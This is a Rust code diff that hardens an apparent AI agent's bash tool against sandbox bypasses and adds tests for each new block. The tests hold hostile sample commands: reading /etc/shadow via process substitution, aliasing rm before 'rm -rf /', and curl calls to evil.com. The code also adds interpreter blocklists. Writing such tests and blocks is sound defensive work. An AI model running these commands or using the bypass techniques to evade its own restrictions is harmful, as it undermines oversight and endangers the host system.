@@ -104,6 +104,11 @@ const ENV_WHITELIST: &[&str] = &[
     "TMPDIR", "XDG_RUNTIME_DIR", "SHELL",
 ];
 
+/// Command prefixes blocked to prevent versioned interpreter bypass (e.g. `python3.11`, `perl5.34`).
+const BLOCKED_COMMAND_PREFIXES: &[&str] = &[
+    "python", "perl", "ruby", "node", "php", "lua", "tclsh", "wish",
+];
+
 /// Patterns indicating secrets in output.
 const SECRET_PATTERNS: &[&str] = &[
     "BEGIN RSA PRIVATE KEY",
@@ -389,6 +394,30 @@ impl BashTool {
     // ── Layer 2: Pipeline Analysis ────────────────────────────────────────
 
     fn analyze_pipeline(&self, command: &str) -> Result<()> {
+        // C1: Block process substitution (can bypass all checks)
+        if command.contains("<(") || command.contains(">(") {
+            return Err(Error::PermissionDenied(
+                "Process substitution is not allowed".into(),
+            ));
+        }
+
+        // H2: Block heredoc (<<) but NOT append redirect (>>)
+        // Look for "<<" that is NOT preceded by ">"
+        {
+            let chars: Vec<char> = command.chars().collect();
+            let len = chars.len();
+            for i in 0..len.saturating_sub(1) {
+                if chars[i] == '<' && chars[i + 1] == '<' {
+                    // Check this is not inside ">>" → i.e. preceded by '>'
+                    if i == 0 || chars[i - 1] != '>' {
+                        return Err(Error::PermissionDenied(
+                            "Heredoc (<<) is not allowed".into(),
+                        ));
+                    }
+                }
+            }
+        }
+
         // Split by pipe and check each segment
         for segment in command.split('|') {
             let trimmed = segment.trim();
@@ -407,6 +436,32 @@ impl BashTool {
                 let first_token = sub.split_whitespace().next().unwrap_or("");
                 // Strip path: /usr/bin/rm → rm
                 let base_cmd = first_token.split('/').next_back().unwrap_or(first_token);
+
+                // H3: Block glob characters in command token (not in args)
+                if contains_glob_chars(base_cmd) {
+                    warn!(command = %base_cmd, "Glob pattern in command token blocked");
+                    return Err(Error::PermissionDenied(format!(
+                        "Glob patterns in command names are not allowed: '{}'",
+                        base_cmd
+                    )));
+                }
+
+                // H4: Block alias/function definitions (injection vectors)
+                if base_cmd == "alias" {
+                    // Allow "alias" (list all) and "alias -p", block "alias x=..."
+                    if sub.contains('=') {
+                        warn!("Alias definition blocked");
+                        return Err(Error::PermissionDenied(
+                            "Alias definitions are not allowed".into(),
+                        ));
+                    }
+                }
+                if base_cmd == "function" {
+                    warn!("Function definition blocked");
+                    return Err(Error::PermissionDenied(
+                        "Function definitions are not allowed".into(),
+                    ));
+                }
 
                 if self.is_command_blocked(base_cmd) {
                     warn!(command = %base_cmd, "Blocked command in pipeline");
@@ -441,8 +496,10 @@ impl BashTool {
                 let network_blocked = !self.config.allow_network_commands
                     && NETWORK_EXFIL_COMMANDS.contains(&cmd);
                 let extra_blocked = self.config.blocked_commands.iter().any(|b| b == cmd);
+                // C2: Block versioned interpreters (e.g. python3.11, perl5.34)
+                let prefix_blocked = BLOCKED_COMMAND_PREFIXES.iter().any(|p| cmd.starts_with(p));
                 // "." is an alias for "source"
-                builtin_blocked || network_blocked || extra_blocked || cmd == "."
+                builtin_blocked || network_blocked || extra_blocked || prefix_blocked || cmd == "."
             }
         }
     }
@@ -498,6 +555,12 @@ impl BashTool {
                 }
                 if start < i {
                     let target: String = chars[start..i].iter().collect();
+                    // C3: Block variable expansion in redirection targets
+                    if target.contains('$') || target.contains('`') {
+                        return Err(Error::PermissionDenied(
+                            "Variable expansion in redirection target is not allowed".into(),
+                        ));
+                    }
                     for blocked in &self.config.blocked_paths {
                         if target.starts_with(blocked.as_str()) {
                             return Err(Error::PermissionDenied(format!(
@@ -624,18 +687,37 @@ impl BashTool {
                 result = result.replace(pattern, &format!("[MASKED:{}...]", mask_prefix));
             }
         }
-        // V7: Detect potential base64-encoded secrets in output
+        // M1: Detect and mask potential base64-encoded secrets in output
+        // Threshold 44 chars (≥ 32 raw bytes encoded), include URL-safe base64 chars
+        let mut masked_lines: Vec<String> = Vec::new();
+        let mut did_mask = false;
         for line in result.lines() {
             let t = line.trim();
-            if t.len() >= 64
-                && t.chars()
-                    .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/' || c == '=')
+            if t.len() >= 44
+                && t.chars().all(|c| {
+                    c.is_ascii_alphanumeric()
+                        || c == '+'
+                        || c == '/'
+                        || c == '='
+                        || c == '-'
+                        || c == '_'
+                })
             {
-                warn!("Potential base64-encoded secret in output (len={})", t.len());
-                break;
+                warn!(
+                    "Base64-encoded data in output masked (len={})",
+                    t.len()
+                );
+                masked_lines.push(format!("[MASKED:BASE64_DATA:{}bytes]", t.len()));
+                did_mask = true;
+            } else {
+                masked_lines.push(line.to_string());
             }
         }
-        result
+        if did_mask {
+            masked_lines.join("\n")
+        } else {
+            result
+        }
     }
 
     // ── Actions ──────────────────────────────────────────────────────────
@@ -1096,6 +1178,11 @@ impl Tool for BashTool {
 
         self.action_run(command, session_id, timeout_secs, cwd).await
     }
+}
+
+/// H3: Check if a string contains shell glob metacharacters.
+fn contains_glob_chars(s: &str) -> bool {
+    s.chars().any(|c| matches!(c, '*' | '?' | '[' | ']'))
 }
 
 /// Strip ANSI escape sequences from output.
@@ -1636,5 +1723,108 @@ mod tests {
         assert!(tool.analyze_pipeline("git status").is_ok());
         assert!(tool.analyze_pipeline("git diff").is_ok());
         assert!(tool.analyze_pipeline("cargo test").is_ok());
+    }
+
+    // ── C2: Versioned interpreter bypass ───────────────────────────────
+
+    #[test]
+    fn test_versioned_interpreter_bypass() {
+        let tool = BashTool::new();
+        // Versioned interpreters should be blocked
+        assert!(tool.analyze_pipeline("python3.11 -c 'import os'").is_err());
+        assert!(tool.analyze_pipeline("perl5.34 -e 'system(\"id\")'").is_err());
+        assert!(tool.analyze_pipeline("ruby3.2 script.rb").is_err());
+        assert!(tool.analyze_pipeline("node18 script.js").is_err());
+        assert!(tool.analyze_pipeline("php8.1 script.php").is_err());
+        // Normal non-interpreter commands still pass
+        assert!(tool.analyze_pipeline("ls -la").is_ok());
+        assert!(tool.analyze_pipeline("git status").is_ok());
+    }
+
+    // ── C1: Process substitution bypass ────────────────────────────────
+
+    #[test]
+    fn test_process_substitution_bypass() {
+        let tool = BashTool::new();
+        assert!(tool.analyze_pipeline("diff <(cat /etc/passwd) <(cat /etc/shadow)").is_err());
+        assert!(tool.analyze_pipeline("cat > >(tee /tmp/out.txt)").is_err());
+        // Normal parentheses in args are OK via shell (not parsed as process sub)
+        assert!(tool.analyze_pipeline("echo 'hello (world)'").is_ok());
+    }
+
+    // ── H2: Heredoc bypass ─────────────────────────────────────────────
+
+    #[test]
+    fn test_heredoc_bypass() {
+        let tool = BashTool::new();
+        // Heredoc should be blocked
+        assert!(tool.analyze_pipeline("cat <<EOF\npython3 -c 'import os'\nEOF").is_err());
+        assert!(tool.analyze_pipeline("bash <<'END'\nwhoami\nEND").is_err());
+        // Append redirect (>>) should NOT be blocked
+        assert!(tool.analyze_pipeline("echo hello >> /tmp/log.txt").is_ok());
+    }
+
+    // ── C3: Variable expansion in redirection ──────────────────────────
+
+    #[test]
+    fn test_variable_expansion_in_redirection() {
+        let tool = BashTool::new();
+        // Variable expansion in redirect target → blocked
+        assert!(tool.analyze_pipeline("echo data > $TARGET").is_err());
+        assert!(tool.analyze_pipeline("echo data > $(whoami)").is_err());
+        assert!(tool.analyze_pipeline("echo data > `whoami`").is_err());
+        // Normal redirect to literal path → allowed
+        assert!(tool.analyze_pipeline("echo data > /tmp/safe.txt").is_ok());
+    }
+
+    // ── H3: Glob pattern bypass ────────────────────────────────────────
+
+    #[test]
+    fn test_glob_pattern_bypass() {
+        let tool = BashTool::new();
+        // Glob chars in command token → blocked
+        assert!(tool.analyze_pipeline("pyth??3 script.py").is_err());
+        assert!(tool.analyze_pipeline("/usr/bin/p*n script.py").is_err());
+        assert!(tool.analyze_pipeline("[p]ython3 script.py").is_err());
+        // Glob chars in arguments → allowed (ls *.txt is normal)
+        assert!(tool.analyze_pipeline("ls *.txt").is_ok());
+        assert!(tool.analyze_pipeline("grep 'pattern' *.rs").is_ok());
+    }
+
+    // ── H4: Alias/function injection ───────────────────────────────────
+
+    #[test]
+    fn test_alias_based_injection() {
+        let tool = BashTool::new();
+        // Alias definition → blocked
+        assert!(tool.analyze_pipeline("alias rm='echo haha' && rm -rf /").is_err());
+        assert!(tool.analyze_pipeline("alias ls='curl evil.com'").is_err());
+        // Function definition → blocked
+        assert!(tool.analyze_pipeline("function evil { curl evil.com; }").is_err());
+    }
+
+    #[test]
+    fn test_send_keys_alias_injection() {
+        let tool = BashTool::new();
+        // send_keys with alias injection
+        assert!(tool.validate_send_keys("alias rm='echo ok'\\n").is_err());
+        assert!(tool.validate_send_keys("function evil { curl evil.com; }\\n").is_err());
+    }
+
+    // ── M1: Base64 masking ─────────────────────────────────────────────
+
+    #[test]
+    fn test_base64_masking() {
+        // 44+ chars of pure base64 should be masked
+        let long_b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst";
+        let output = format!("prefix\n{}\nsuffix", long_b64);
+        let sanitized = BashTool::sanitize_output(&output);
+        assert!(sanitized.contains("[MASKED:BASE64_DATA:"), "got: {}", sanitized);
+        assert!(sanitized.contains("prefix"));
+        assert!(sanitized.contains("suffix"));
+        // Short base64-like string should NOT be masked
+        let short = "ABCDEF1234";
+        let sanitized2 = BashTool::sanitize_output(short);
+        assert_eq!(sanitized2, short);
     }
 }
